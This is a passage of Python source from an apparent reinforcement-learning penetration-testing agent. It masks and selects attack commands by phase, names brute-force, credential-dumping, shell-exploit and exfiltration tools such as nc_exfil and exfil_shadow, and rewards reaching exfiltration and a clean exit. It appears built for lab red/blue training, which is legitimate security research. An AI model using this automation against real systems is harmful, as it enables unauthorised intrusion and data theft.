        _, _, _, encode_state = _lazy_ppo()
        if encode_state is None:
            return None

        ctx = step_ctx.attack_context
        try:
            import torch
            device = self.ppo_agent.device

            # Build state dict for encoder
            state_dict = step_ctx.state if step_ctx.state else {}
            if not state_dict:
                state_dict = {
                    "state_flags": dict(ctx.state_flags),
                    "open_ports": list(ctx.discoveries.get("open_port", set())),
                    "target_ip": ctx.target,
                }

            state_tensor = encode_state(
                state_dict, device,
                current_step=step_ctx.step,
                max_steps=250,
                steps_in_phase=0,
                phase_transitions=0,
                agent_role=self.agent_role.get("role", ""),
                # Phase 6.9.6: Reasoning context signals
                failed_commands_ratio=(
                    self._reasoning_failed_commands / max(self._reasoning_total_commands, 1)
                    if hasattr(self, '_reasoning_failed_commands') else 0.0
                ),
                unique_tools_used=len(self.episode_used_commands),
                commands_since_discovery=(
                    step_ctx.step - getattr(self, '_reasoning_last_discovery_step', 0)
                ),
                decision_source_ppo_ratio=(
                    self._reasoning_ppo_decisions / max(self._reasoning_total_decisions, 1)
                    if hasattr(self, '_reasoning_ppo_decisions') else 0.0
                ),
                anti_repeat_ratio=(
                    self._reasoning_anti_repeat_decisions / max(self._reasoning_total_decisions, 1)
                    if hasattr(self, '_reasoning_anti_repeat_decisions') else 0.0
                ),
                reward_trend=(
                    (sum(self._reasoning_step_rewards[-5:]) / max(len(self._reasoning_step_rewards[-5:]), 1))
                    / 200.0  # Normalize to ~0-1 range
                    if hasattr(self, '_reasoning_step_rewards') and self._reasoning_step_rewards else 0.0
                ),
                highest_reward_step=(
                    min(self._reasoning_highest_reward / 300.0, 1.0)
                    if hasattr(self, '_reasoning_highest_reward') else 0.0
                ),
            )

            # Build mask: only commands in filtered_commands AND in mapper
            filtered_names = {c.name for c in filtered_commands}
            mask = torch.zeros(self.action_mapper.action_dim, dtype=torch.bool)
            for idx, (name, _template) in enumerate(self.action_mapper.commands):
                if name in filtered_names:
                    mask[idx] = True

            # Also apply precondition mask from mapper
            precond_mask = self.action_mapper.get_action_mask_with_counts(
                ctx.state_flags,
                self.command_repeat_count,
                max_repeats=1,  # Match anti-repeat guard: block ANY exact repeat
            )
            mask = mask & precond_mask
            
            # ─── Phase 9.0: DDQN macro-intent command filter ────────────
            # If DDQN selected a macro-intent, further constrain PPO to only
            # commands within that macro's allowed set. This is the key
            # hierarchy: DDQN picks strategy, PPO picks tactics.
            if self._active_macro is not None:
                try:
                    from core.algorithms.ddqn_macro import MACRO_COMMAND_MAP
                    macro_allowed = MACRO_COMMAND_MAP.get(self._active_macro, set())
                    if macro_allowed:
                        macro_mask = torch.zeros_like(mask)
                        for idx, (name, _tpl) in enumerate(self.action_mapper.commands):
                            if name in macro_allowed and mask[idx]:
                                macro_mask[idx] = True
                        # Only apply if at least 2 commands remain
                        if macro_mask.sum() >= 2:
                            mask = macro_mask
                            logger.debug(
                                f"[DDQN-MASK][{self.agent_name}] Macro {self._active_macro.name} "
                                f"→ {int(macro_mask.sum())} commands"
                            )
                        else:
                            logger.debug(
                                f"[DDQN-MASK][{self.agent_name}] Macro {self._active_macro.name} "
                                f"too restrictive ({int(macro_mask.sum())} cmds), skipping"
                            )
                except Exception as e:
                    logger.debug(f"[DDQN-MASK] Failed: {e}")
            
            # Also block commands whose PREFIX has been used 3+ times
            # (matches the anti-repeat guard's prefix check)
            all_cmds = ctx.command_history if ctx.command_history else []
            from collections import Counter
            prefix_counts = Counter(
                c.strip().split()[0].lower() for c in all_cmds if c.strip()
            )
            for idx, (name, tpl) in enumerate(self.action_mapper.commands):
                if tpl and mask[idx]:
                    # Get the command prefix from template
                    cmd_prefix = tpl.template.split()[0].lower() if tpl.template else name.split("_")[0].lower()
                    if prefix_counts.get(cmd_prefix, 0) >= 3:
                        mask[idx] = False

            # ─── R67: Soft-penalize already-used templates in PPO logits ─
            # Instead of hard-masking used templates (which causes PPO to never
            # learn they're bad), apply a logit bias that makes them less likely.
            # This teaches PPO to deprioritize repeated commands over time.
            _r67_logit_bias = torch.zeros(self.action_mapper.action_dim)
            _used_templates = self.episode_used_commands  # set of template names used this ep
            if _used_templates:
                for idx, (name, _tpl) in enumerate(self.action_mapper.commands):
                    if name in _used_templates and mask[idx]:
                        _use_count = self.command_repeat_count.get(name, 0)
                        # Progressive penalty: -1.0 per use, up to -4.0
                        _r67_logit_bias[idx] = -min(4.0, 1.0 * _use_count)

            # Phase 6.4: Block commands whose tool is known to not exist on target
            _ft = getattr(self, '_failed_tools', set())
            if _ft:
                for idx, (name, tpl) in enumerate(self.action_mapper.commands):
                    if tpl and mask[idx]:
                        cmd_tool = tpl.template.split()[0].lower() if tpl.template else ""
                        if cmd_tool in _ft:
                            mask[idx] = False

            # Phase 7.5: Block commands whose tool is NOT INSTALLED on host
            _ut = getattr(self, '_unavailable_tools', set())
            if _ut:
                for idx, (name, tpl) in enumerate(self.action_mapper.commands):
                    if tpl and mask[idx]:
                        cmd_tool = tpl.template.strip().split()[0].lower() if tpl.template else ""
                        # Strip path prefixes and shell variables
                        if "/" in cmd_tool:
                            cmd_tool = cmd_tool.rsplit("/", 1)[-1]
                        if cmd_tool in _ut:
                            mask[idx] = False

            # Phase 7.5: Block HTTP-targeting commands when port 80 is closed
            _discovered = ctx.discoveries.get("open_port", set()) if ctx.discoveries else set()
            _flags = ctx.state_flags if ctx.state_flags else {}
            _has_http = ("80" in _discovered or "8080" in _discovered
                         or _flags.get("http_service_found", False)
                         or _flags.get("http_found", False))
            if not _has_http:
                _HTTP_TOOLS = {"gobuster", "feroxbuster", "dirsearch", "nikto",
                               "ffuf", "whatweb", "wpscan", "sqlmap", "commix",
                               "dirb", "wfuzz", "gospider", "katana", "arjun"}
                for idx, (name, tpl) in enumerate(self.action_mapper.commands):
                    if tpl and mask[idx]:
                        cmd_tool = tpl.template.strip().split()[0].lower() if tpl.template else ""
                        if cmd_tool in _HTTP_TOOLS:
                            mask[idx] = False
                        # Also catch commands with http:// in template
                        elif tpl.template and "http://" in tpl.template.lower():
                            mask[idx] = False

            # ─── Phase 8.0/8.2: Block Windows-only commands on Linux targets ─
            # MS2/MS3 are Linux — commands like mimikatz, evil-winrm, rubeus are dead weight
            # Phase 8.2 Batch 9: Fixed mimikatz names to match actual registry entries
            _platform = getattr(ctx, 'platform', 'linux') or 'linux'
            if 'linux' in str(_platform).lower():
                _WINDOWS_ONLY = {
                    # Evil-WinRM
                    "evil_winrm", "evil_winrm_hash",
                    # Mimikatz (corrected names matching command_registry.py)
                    "mimikatz_logonpasswords", "mimikatz_sam", "mimikatz_dcsync",
                    # Windows enumeration
                    "winpeas", "whoami_all", "systeminfo",
                    "windows_exploit_suggester", "accesschk_services", "powerup",
                    # Kerberos/AD (Windows domain)
                    "rubeus_asreproast", "rubeus_kerberoast", "secretsdump_dc",
                    "crackmapexec_winrm", "mssql_login", "ntlmrelayx", "responder",
                    "certipy_find", "bloodhound_collect", "sharphound",
                    "bloodhound_python",  # R46: always fails with ModuleNotFoundError on Linux
                    # Impacket (Windows-oriented: psexec/wmiexec/atexec/smbexec)
                    "impacket_psexec", "impacket_wmiexec", "impacket_smbexec",
                    "impacket_GetNPUsers", "impacket_GetUserSPNs",
                }
                for idx, (name, _tpl) in enumerate(self.action_mapper.commands):
                    if name in _WINDOWS_ONLY and mask[idx]:
                        mask[idx] = False

            # ─── Phase 8.0: Shell priority mask ─────────────────────────
            # When credentials are known but shell not obtained, narrow PPO to
            # shell-granting commands so it learns to exploit creds → shell.
            _creds_known = _flags.get("credentials_known", False)
            _shell_obtained = _flags.get("shell_obtained", False)

            # ─── Batch 15: Block brute-force commands when creds are known ──
            # PPO was selecting hydra even with credentials_known, causing 120s
            # timeouts.  Playbook + registry paths already have this guard
            # (CRED_SEARCH_COMMANDS) — PPO must match.
            if _creds_known:
                _BRUTE_FORCE_COMMANDS = {
                    "hydra_ssh", "hydra_ftp", "hydra_smb", "hydra_http_form",
                    "hydra_http", "hydra_mysql",
                    "medusa_ssh", "medusa_ftp", "brute_force", "brute_ssh",
                    "patator_ssh", "ncrack_ssh", "john_crack", "hashcat_crack",
                    "cewl_wordlist", "crunch_wordlist",
                }
                for idx, (name, _tpl) in enumerate(self.action_mapper.commands):
                    if name in _BRUTE_FORCE_COMMANDS and mask[idx]:
                        mask[idx] = False

            if _creds_known and not _shell_obtained:
                _SHELL_COMMANDS = {
                    "ssh_login", "telnet_login", "psql_rce", "mysql_root_login",
                    "telnet_1524", "rsh_root", "rlogin_root", "samba_exploit",
                    "vsftpd_exploit", "unrealircd_exploit", "java_rmi_exploit",
                }
                shell_mask = torch.zeros_like(mask)
                for idx, (name, _tpl) in enumerate(self.action_mapper.commands):
                    if name in _SHELL_COMMANDS and mask[idx]:
                        shell_mask[idx] = True
                if shell_mask.any():
                    mask = shell_mask
                    logger.debug(
                        f"[PPO-SHELL-PRIORITY] {self.agent_name}: Narrowed to "
                        f"{int(shell_mask.sum())} shell-granting commands"
                    )

            # ─── Phase 8.0: Post-exploitation priority mask ────────────
            # When shell IS obtained, bias PPO toward post-exploitation commands
            # to maximize learning during post-shell exploration period.
            if _shell_obtained and _creds_known:
                _POST_EXPLOIT_COMMANDS = {
                    "dump_shadow", "dump_passwd", "find_suid", "find_world_writable",
                    "check_sudo", "cat_shadow", "cat_passwd", "mysql_dump",
                    "dump_hashes", "crack_hashes", "enum_users_local",
                    "find_sensitive_files", "check_crontab", "check_ssh_keys",
                    "exfil_shadow", "exfil_ssh_keys", "exfil_mysql_dump",
                    "base64_exfil", "nc_exfil", "scp_exfil",
                    "linpeas", "priv_esc_check", "kernel_exploit_check",
                    "enum_network_local", "arp_scan_internal",
                }
                postexploit_mask = torch.zeros_like(mask)
                for idx, (name, _tpl) in enumerate(self.action_mapper.commands):
                    if name in _POST_EXPLOIT_COMMANDS and mask[idx]:
                        postexploit_mask[idx] = True
                if postexploit_mask.sum() >= 3:  # Only apply if enough options
                    # 50% chance to narrow to post-exploit commands
                    if random.random() < 0.5:
                        mask = postexploit_mask
                        logger.debug(
                            f"[PPO-POSTEXPLOIT] {self.agent_name}: Narrowed to "
                            f"{int(postexploit_mask.sum())} post-exploitation commands"
                        )

            # ─── Phase 8.0: Safe mask relaxation ─────────────────────────
            # When mask is all-zero, relax to precondition mask BUT keep
            # unavailable tool + HTTP filters to prevent wasted actions.
            if not mask.any():
                mask = precond_mask.clone()
                # Re-apply unavailable tool filter
                if _ut:
                    for idx, (name, tpl) in enumerate(self.action_mapper.commands):
                        if tpl and mask[idx]:
                            cmd_tool = tpl.template.strip().split()[0].lower() if tpl.template else ""
                            if "/" in cmd_tool:
                                cmd_tool = cmd_tool.rsplit("/", 1)[-1]
                            if cmd_tool in _ut:
                                mask[idx] = False
                # Re-apply HTTP filter
                if not _has_http:
                    _HTTP_TOOLS_RELAX = {"gobuster", "feroxbuster", "dirsearch", "nikto",
                                         "ffuf", "whatweb", "wpscan", "sqlmap", "commix",
                                         "dirb", "wfuzz", "gospider", "katana", "arjun"}
                    for idx, (name, tpl) in enumerate(self.action_mapper.commands):
                        if tpl and mask[idx]:
                            cmd_tool = tpl.template.strip().split()[0].lower() if tpl.template else ""
                            if cmd_tool in _HTTP_TOOLS_RELAX:
                                mask[idx] = False
                            elif tpl.template and "http://" in tpl.template.lower():
                                mask[idx] = False
                if not mask.any():
                    # True last resort: allow everything
                    mask[:] = True

            # ─── Phase 8.2 Batch 11: FINAL unavailable-tool sweep ────────
            # All mask manipulations above (shell priority, post-exploit
            # priority, safe relaxation, mask[:]=True last resort) can
            # RE-ENABLE commands for unavailable tools.  This final sweep
            # guarantees PPO NEVER selects a tool that isn't installed,
            # regardless of which mask path was taken.
            if _ut:
                for idx, (name, tpl) in enumerate(self.action_mapper.commands):
                    if tpl and mask[idx]:
                        cmd_tool = tpl.template.strip().split()[0].lower() if tpl.template else ""
                        if "/" in cmd_tool:
                            cmd_tool = cmd_tool.rsplit("/", 1)[-1]
                        if cmd_tool in _ut:
                            mask[idx] = False
                # Also block Windows-only tools on Linux (may have been re-enabled)
                if 'linux' in str(_platform).lower():
                    for idx, (name, _tpl) in enumerate(self.action_mapper.commands):
                        if name in _WINDOWS_ONLY and mask[idx]:
                            mask[idx] = False
                # If sweep killed everything, allow precondition-free available tools
                if not mask.any():
                    for idx, (name, tpl) in enumerate(self.action_mapper.commands):
                        if tpl and not tpl.preconditions:
                            cmd_tool = tpl.template.strip().split()[0].lower() if tpl.template else ""
                            if "/" in cmd_tool:
                                cmd_tool = cmd_tool.rsplit("/", 1)[-1]
                            if cmd_tool not in _ut:
                                mask[idx] = True

            # ─── R68: Phase-gated head selection ────────────────────────
            # Map current attack phase to phase group (0=recon, 1=exploit, 2=post)
            # Codex can override via _r68_forced_phase_group for stagnation breaks
            _PHASE_TO_GROUP = {
                AttackPhase.RECON: 0,
                AttackPhase.ENUMERATION: 0,
                AttackPhase.EXPLOITATION: 1,
                AttackPhase.PRIVILEGE_ESCALATION: 1,
                AttackPhase.LATERAL_MOVEMENT: 2,
                AttackPhase.POST_EXPLOITATION: 2,
                AttackPhase.EXFILTRATION: 2,
                AttackPhase.CLOSEOUT: 2,
            }
            _r68_phase_group = _PHASE_TO_GROUP.get(
                ctx.current_phase, 0
            )
            # Codex override: force a different phase head for stagnation breaking
            _forced = getattr(self, '_r68_forced_phase_group', None)
            if _forced is not None:
                _r68_phase_group = _forced
                self._r68_forced_phase_group = None  # Single-use override
                logger.debug(
                    f"[R68-GATE][{self.agent_name}] Codex forced phase_group={_forced}"
                )

            # PPO selects — R67: logit_bias, R68: phase_group
            action_idx, log_prob, value = self.ppo_agent.select_action(
                state_tensor, training=True, action_mask=mask,
                logit_bias=_r67_logit_bias if _r67_logit_bias.any() else None,
                phase_group=_r68_phase_group,
            )

            template_name = self.action_mapper.action_to_name(action_idx)
            if template_name is None:
                return None

            # Handle Blue agent custom commands
            if self.agent_name == "BlueAgent":
                blue_cmd = self.action_mapper.get_blue_command(action_idx)
                if blue_cmd:
                    cmd_str, desc = blue_cmd
                    self._ppo_pending = {
                        "state": state_tensor, "action": action_idx,
                        "log_prob": log_prob, "value": value,
                    }
                    return SmartDecisionResult(
                        command=cmd_str,
                        template_name=template_name,
                        params={},
                        mentor_call=False,
                        mentor_reasoning=f"🧠 PPO → {desc}",
                        confidence=0.7,
                        phase=ctx.current_phase,
                        source="ppo",
                    )

            template = COMMAND_REGISTRY.get(template_name)
            if not template:
                return None

            # Render command with params
            params = {}
            for p in template.required_params:
                params[p] = self._get_default_param(p, ctx)
            params.update(template.optional_params)

            try:
                command = render_command(template, params)
            except ValueError:
                return None

            # Store pending trajectory entry (reward paired later in record_result)
            self._ppo_pending = {
                "state": state_tensor, "action": action_idx,
                "log_prob": log_prob, "value": value,
            }

            self.step_used_commands.add(template.name)
            self.episode_used_commands.add(template.name)
            self.command_repeat_count[template.name] = (
                self.command_repeat_count.get(template.name, 0) + 1
            )

            return SmartDecisionResult(
                command=command,
                template_name=template.name,
                params=params,
                mentor_call=False,
                mentor_reasoning=f"🧠 PPO[{action_idx}] → {template.description[:40]}",
                confidence=0.7,
                phase=template.phase,
                source="ppo",
            )
        except Exception as e:
            logger.debug(f"PPO select failed for {self.agent_name}: {e}")
            return None

    # Phase 6: Terminal reward mapping — reduced to match tighter reward scale
    # Phase 6.9: CLOSEOUT-centric terminal rewards.
    # EXFIL is no longer the big dopamine hit — CLEAN EXIT is.
    # Missing CLOSEOUT after reaching EXFIL = penalty (failed to finish the job).
    PPO_TERMINAL_REWARDS = {
        "CLOSEOUT": 40.0,         # BIG: clean exit = mission success
        "EXFILTRATION": 10.0,     # Moderate: you got data but didn't clean up
        "POST_EXPLOITATION": 8.0,
        "LATERAL_MOVEMENT": 5.0,
        "PRIVILEGE_ESCALATION": 3.0,
        "EXPLOITATION": 2.0,
    }
    # Phase 6.9: Penalty for reaching EXFIL but NOT completing CLOSEOUT
    PPO_INCOMPLETE_CLOSEOUT_PENALTY = -15.0

    def end_episode_ppo(
        self, done: bool = True, highest_phase: str = ""
    ) -> Optional[Dict[str, float]]:
        """Feed collected trajectory to PPO and run update.

        Called by SmartOrchestrator at the end of each episode.
        Phase 5.1: injects terminal reward into last trajectory entry
        so PPO gradient path sees phase-completion incentive.

        Args:
            done: Whether the episode terminated.
            highest_phase: Name of highest attack phase reached (e.g. "EXFILTRATION").

        Returns:
            PPO training metrics dict, or None if no update was needed.
        """
        if not self.ppo_agent or not self._ppo_trajectory:
            self._ppo_trajectory.clear()
            self._ppo_pending = None
            return None

        try:
            # Phase 6.9: inject terminal reward + incomplete-closeout penalty
            if highest_phase and self._ppo_trajectory:
                terminal_bonus = self.PPO_TERMINAL_REWARDS.get(highest_phase, 0.0)
                if terminal_bonus > 0:
                    self._ppo_trajectory[-1]["reward"] += terminal_bonus
                    logger.debug(
                        f"[PPO][{self.agent_name}] Terminal bonus +{terminal_bonus:.1f} "
                        f"for reaching {highest_phase}"
                    )
                # Phase 6.9: Penalize reaching EXFIL but not CLOSEOUT
                # This teaches PPO that the job isn't done until cleanup is complete
                if highest_phase == "EXFILTRATION":
                    self._ppo_trajectory[-1]["reward"] += self.PPO_INCOMPLETE_CLOSEOUT_PENALTY
                    logger.debug(
                        f"[PPO][{self.agent_name}] Incomplete closeout penalty "
                        f"{self.PPO_INCOMPLETE_CLOSEOUT_PENALTY:.1f} (reached EXFIL but not CLOSEOUT)"
                    )
                # R54: Efficiency bonus REMOVED.
                # R52-R53 showed this trained PPO to rush episodes (avg 16 steps),
                # reducing cumulative reward. R48 (avg 27 steps, +2863.8) proves
                # longer episodes = more total reward. Removing the speed incentive
                # lets PPO optimize for cumulative reward through deeper exploration.
                # (Was: 5.0 × (25 - traj_len), capped at 50.0)
                
                # ── R58 Layer 2b: Fast-completion terminal bonus ────────
                # Compensate PPO for fewer reward-accumulation steps when
                # CLOSEOUT is reached efficiently. R57 episodes averaged 18 steps
                # vs R48's 25, losing ~500 cumulative reward from shorter runs.
                # This bonus teaches PPO that fast CLOSEOUT is GOOD, not a penalty.
                # Only applies when CLOSEOUT is actually reached (not for rushers).
                if highest_phase == "CLOSEOUT" and self._ppo_trajectory:
                    traj_len = len(self._ppo_trajectory)
                    _max_steps = 40  # Default max steps per episode
                    speed_bonus = min(30.0, max(0.0, (_max_steps - traj_len) * 1.0))
                    if speed_bonus > 0:
                        self._ppo_trajectory[-1]["reward"] += speed_bonus
                        logger.debug(
                            f"[PPO][{self.agent_name}] R58 speed bonus +{speed_bonus:.1f} "
                            f"(CLOSEOUT in {traj_len} steps)"
                        )

            # ── R69: Hindsight Trajectory Relabeling (HTR) ──────────
            # Walk backward through the trajectory: when a step produced
            # discoveries, retroactively credit prior steps whose commands
            # ENABLED those discoveries (via precondition chains).
            # This solves temporal credit assignment: nmap at step 3 that
            # discovers ports gets credit when exploit at step 8 uses them.
            #
            # Also applies chain momentum: consecutive discovery steps get
            # amplifying retroactive bonuses.
            # ─────────────────────────────────────────────────────────────
            _htr_total = 0.0
            _htr_count = 0
            HTR_WINDOW = 6       # Look back up to 6 steps
            HTR_ALPHA = 0.25     # Fraction of discovery reward attributed back
            HTR_DECAY = 0.85     # Per-step decay within the window
            
            # Discovery types → what preconditions they satisfy
            _DISC_TO_PRECOND = {
                "open_port": {"ports_discovered"},
                "service": {"services_discovered", "ports_discovered"},
                "version_info": {"services_discovered"},
                "credential": {"credentials_known"},
                "password": {"credentials_known"},
                "shell": {"shell_obtained"},
                "root_shell": {"shell_obtained", "root_obtained"},
                "hash": {"hash_known"},
                "vulnerability": {"vulnerability_found"},
            }
            
            traj = self._ppo_trajectory
            for i in range(len(traj) - 1, 0, -1):
                disc_types = traj[i].get("_r69_discoveries", [])
                if not disc_types:
                    continue
                
                # Compute what preconditions this discovery satisfies
                _satisfied = set()
                for dt in disc_types:
                    _satisfied |= _DISC_TO_PRECOND.get(dt, set())
                
                if not _satisfied:
                    continue
                
                # Walk backward from i-1 to max(0, i-HTR_WINDOW)
                _disc_reward = traj[i]["reward"]
                for j in range(i - 1, max(-1, i - 1 - HTR_WINDOW), -1):
                    _prior_template = traj[j].get("_r69_template", "")
                    _prior_preconds = traj[j].get("_r69_preconditions", set())
                    
                    # Credit if: (a) prior step has preconditions matching what
                    # this discovery satisfies (causal link), OR
                    # (b) prior step itself had discoveries (chain momentum)
                    _causal = bool(_prior_preconds & _satisfied)
                    _chain = bool(traj[j].get("_r69_discoveries", []))
                    
                    if _causal or _chain:
                        distance = i - j
                        bonus = HTR_ALPHA * abs(_disc_reward) * (HTR_DECAY ** distance)
                        bonus = min(bonus, 10.0)  # Cap per-link bonus
                        traj[j]["reward"] += bonus
                        _htr_total += bonus
                        _htr_count += 1
            
            if _htr_count > 0:
                logger.info(
                    f"[PPO][{self.agent_name}] R69 HTR: relabeled {_htr_count} "
                    f"trajectory entries, total bonus +{_htr_total:.1f}"
                )

            for t in self._ppo_trajectory:
                self.ppo_agent.store_transition(
                    state=t["state"],
                    action=t["action"],
                    log_prob=t["log_prob"],
                    reward=t["reward"],
                    value=t["value"],
                    done=t["done"],
                )

            # Bootstrap value
            last_value = 0.0
            if self._ppo_trajectory and not self._ppo_trajectory[-1]["done"]:
                last_value = self._ppo_trajectory[-1]["value"]

            metrics = self.ppo_agent.update(last_value=last_value)
            if metrics:
                logger.info(
                    f"[PPO][{self.agent_name}] Update #{self.ppo_agent.updates_done}: "
                    f"π={metrics.get('policy_loss', 0):.4f} "
                    f"v={metrics.get('value_loss', 0):.4f} "
                    f"H={metrics.get('entropy', 0):.4f}"
                )
            
            # ── R58 Layer 2c: Signal episode outcome for adaptive entropy ──
            if hasattr(self.ppo_agent, 'signal_episode_outcome'):
                _reached_closeout = (highest_phase == "CLOSEOUT")
                self.ppo_agent.signal_episode_outcome(_reached_closeout)
                logger.debug(
                    f"[PPO][{self.agent_name}] R58 adaptive entropy: "
                    f"closeout={_reached_closeout}, "
                    f"mult={self.ppo_agent._entropy_adaptive_multiplier:.2f}, "
                    f"H_coef={self.ppo_agent.entropy_coef:.4f}"
                )
            
            # ── R70: Store episode in Self-Imitation Learning buffer ──
            # Feed trajectory (states, actions, raw rewards) to SIL buffer.
            # Buffer only stores above-average episodes (positive advantage).
            if hasattr(self.ppo_agent, 'store_sil_episode') and self._ppo_trajectory:
                _sil_states = [t["state"] for t in self._ppo_trajectory]
                _sil_actions = [t["action"] for t in self._ppo_trajectory]
                _sil_rewards = [t["reward"] for t in self._ppo_trajectory]
                _sil_added = self.ppo_agent.store_sil_episode(
                    _sil_states, _sil_actions, _sil_rewards
                )
                if _sil_added > 0:
                    logger.info(
                        f"[PPO][{self.agent_name}] R70 SIL: stored {_sil_added} "
                        f"golden transitions (buffer={len(self.ppo_agent.sil_buffer)})"
                    )

            return metrics
        except Exception as e:
            logger.warning(f"PPO update error for {self.agent_name}: {e}")
            return None
        finally:
            # Phase 8.0: Save episode attack chain to cross-episode memory
            total_ep_reward = sum(t.get("reward", 0) for t in self._ppo_trajectory)
            self._save_episode_chain(total_ep_reward, highest_phase)
            self._reset_episode_chain()
            
            # Phase 8.1: Log learning progress for hypothesis-test-learn cycle
            if self._ppo_trajectory:
                _unique = len(set(t.get("action", 0) for t in self._ppo_trajectory))
                _total = len(self._ppo_trajectory)
                logger.debug(
                    f"[LEARN] {self.agent_name}: {_unique}/{_total} unique PPO actions, "
                    f"hypotheses={len(self._reasoning_hypotheses)}, "
                    f"failures={len(self._reasoning_failures)}"
                )
            
            self._ppo_trajectory.clear()
            self._ppo_pending = None
            
            # Phase 9.0: Reset DDQN episode state
            if self.ddqn_macro is not None:
                self.ddqn_macro.reset_episode()
                self._active_macro = None
                self._ddqn_pending = None
                self._ddqn_prev_macro = None  # R57 Layer 1
                self._last_step_had_discovery = False  # R57 Layer 1
    
    def _decide_with_mentor(
        self,
        step_ctx: SmartStepContext,
        proposed_action: Optional[str],
        confidence: float,
        filtered_commands: Optional[List[CommandTemplate]] = None,
        exfil_prompt: Optional[str] = None,
    ) -> SmartDecisionResult:
        """
        Make decision using the smart mentor (LLM).
        Uses DualMentor (GPT + Venice) if available, otherwise single SmartMentor.
        Validates that mentor's command respects role exclusivity AND anti-loop rules.
        
        Args:
            step_ctx: Current step context
            proposed_action: Proposed action from rule-based system
            confidence: Confidence in proposed action
            filtered_commands: Pre-filtered commands for this agent's role
            exfil_prompt: Optional exfil-specific prompt injection (from MentorController)
        """
        ctx = step_ctx.attack_context
        
        # Phase 6.2: Inject exfil guidance into context if provided
        if exfil_prompt:
            # Temporarily augment the context narrative for the mentor call
            ctx._exfil_injection = exfil_prompt
        
        try:
            # === USE DUAL MENTOR IF AVAILABLE ===
            if self.has_dual_mentor():
                dual_response = self.dual_mentor.get_command(ctx, filtered_commands)
                mentor_response = dual_response.chosen
                provider_used = dual_response.provider_used
                tokens_used = dual_response.tokens_total
                
                if not mentor_response or not mentor_response.is_valid:
                    logger.warning(f"[{self.agent_name}] DualMentor returned invalid response, falling back to registry")
                    return self._decide_from_registry(step_ctx, proposed_action, confidence)
                
                logger.debug(f"[{self.agent_name}] DualMentor chose: {mentor_response.template_name} via {provider_used}")
            else:
                # === SINGLE MENTOR FALLBACK ===
                mentor_response = self.smart_mentor.get_command(ctx, filtered_commands)
                provider_used = "gpt"
                tokens_used = getattr(mentor_response, 'tokens_used', 0)
            
            # VALIDATE: Check if mentor's command violates role exclusivity (belt & suspenders)
            mentor_cmd = mentor_response.command.lower()
            is_valid_for_role = self._validate_command_for_role(mentor_cmd)
            
            if not is_valid_for_role:
                # Mentor suggested a command that belongs to another agent's domain
                logger.debug(f"[{self.agent_name}] Mentor suggested '{mentor_response.command}' but it violates role exclusivity, falling back to registry")
                return self._decide_from_registry(step_ctx, proposed_action, confidence)
            
            # =================================================================
            # CRITICAL: ANTI-LOOP CHECK - LLM often ignores "do not repeat"
            # =================================================================
            mentor_prefix = mentor_cmd.split()[0] if mentor_cmd.split() else ""
            
            # Count how many times this command prefix was used recently
            recent_prefixes = []
            for cmd in ctx.command_history[-10:]:
                parts = cmd.lower().split()
                if parts:
                    recent_prefixes.append(parts[0])
            
            prefix_repeat_count = recent_prefixes.count(mentor_prefix)
            
            # If this prefix was used 2+ times recently, REJECT and use registry fallback
            if prefix_repeat_count >= 2:
                logger.warning(f"[{self.agent_name}] LLM suggested '{mentor_prefix}' but it was used {prefix_repeat_count}x recently - forcing registry fallback")
                # Mark this as a stuck situation for the fallback to handle
                return self._decide_from_registry(step_ctx, proposed_action, confidence)
            
            # Also check if exact command was used before
            if mentor_response.command in ctx.command_history[-5:]:
                logger.warning(f"[{self.agent_name}] LLM suggested exact repeat command - forcing registry fallback")
                return self._decide_from_registry(step_ctx, proposed_action, confidence)
            
            # ─── FIX: Substitute any remaining {param} placeholders ─────
            # Mentor often returns raw templates like "ssh {username}@target"
            # Apply _get_default_param() to fill in missing values
            final_command = mentor_response.command
            import re as _re
            placeholder_pattern = _re.compile(r'\{(\w+)\}')
            placeholders = placeholder_pattern.findall(final_command)
            if placeholders:
                for param_name in placeholders:
                    default_val = self._get_default_param(param_name, ctx)
                    if default_val and not default_val.startswith('{'):
                        final_command = final_command.replace(f'{{{param_name}}}', default_val)
                if final_command != mentor_response.command:
                    logger.debug(f"[{self.agent_name}] Mentor param substitution: {mentor_response.command[:60]} → {final_command[:60]}")
                    mentor_response.command = final_command
            
            # Track command in history
            ctx.command_history.append(mentor_response.command)
            
            # Determine if mentor changed the action
            delta = "changed" if proposed_action and mentor_response.command != proposed_action else "kept"
            
            # Validate token tracking: warn if mentor was called but tokens=0
            if tokens_used == 0:
                logger.debug(f"[TOKEN_WARN] {self.agent_name} mentor call but tokens=0 - may be cached or estimate missing")
            
            # Add provider info to model_used
            model_display = f"{self.model}|{provider_used}" if self.has_dual_mentor() else self.model
            
            return SmartDecisionResult(
                command=mentor_response.command,
                template_name=mentor_response.template_name,
                params=mentor_response.params,
                mentor_call=True,
                model_used=model_display,
                mentor_reasoning=mentor_response.reasoning,
                mentor_delta=delta,
                mentor_provider=provider_used,  # Track which provider was used
                confidence=mentor_response.confidence,
                phase=mentor_response.phase,
                tokens_used=tokens_used,
                source="mentor",  # Phase 0.1 tracking
            )
            
        except Exception as e:
            logger.debug(f"Smart mentor failed: {e}, falling back to registry")
            return self._decide_from_registry(step_ctx, proposed_action, confidence)
    
    def _get_difficulty_alternative(self, step_ctx: SmartStepContext) -> Optional[SmartDecisionResult]:
        """Get an alternative command when difficulty preset blocks the proposed one.

        Finds a registry command for the current phase that is NOT blocked.

        Args:
            step_ctx: Current step context.

        Returns:
            A SmartDecisionResult with an allowed command, or None.
        """
        try:
            ctx = step_ctx.attack_context
            phase = ctx.current_phase
            blocked = self.difficulty_preset.blocked_commands if self.difficulty_preset else frozenset()
            
            # Get all registry commands for this phase
            from core.commands.command_registry import get_commands_for_phase
            candidates = get_commands_for_phase(phase)
            
            # Filter out blocked commands and already-used commands
            valid = [
                c for c in candidates
                if c.name not in blocked
                and c.name not in self.episode_used_commands
                and self._validate_command_for_role(
                    c.template.replace("{target}", ctx.target if ctx else "10.10.10.10")
                )
            ]
            
            if valid:
                import random
                choice = random.choice(valid)
                cmd = choice.template.replace("{target}", ctx.target if ctx else "10.10.10.10")
                return SmartDecisionResult(
                    command=cmd,
                    template_name=choice.name,
                    source="difficulty_gate",
                    confidence=0.5,
                    phase=phase,
                )
        except Exception as e:
            logger.debug(f"Difficulty alternative failed: {e}")
        return None
    
    def _validate_command_for_role(self, command: str) -> bool:
        """
        Check if a command is valid for this agent's role.
        Returns False if the command starts with another agent's exclusive prefix.
        
        Args:
            command: The command string to validate
            
        Returns:
            True if valid for this role, False if it belongs to another agent
        """
        cmd_lower = command.lower().strip()
        # Also check with underscores replaced by hyphens and vice versa
        cmd_alt = cmd_lower.replace('-', '_')
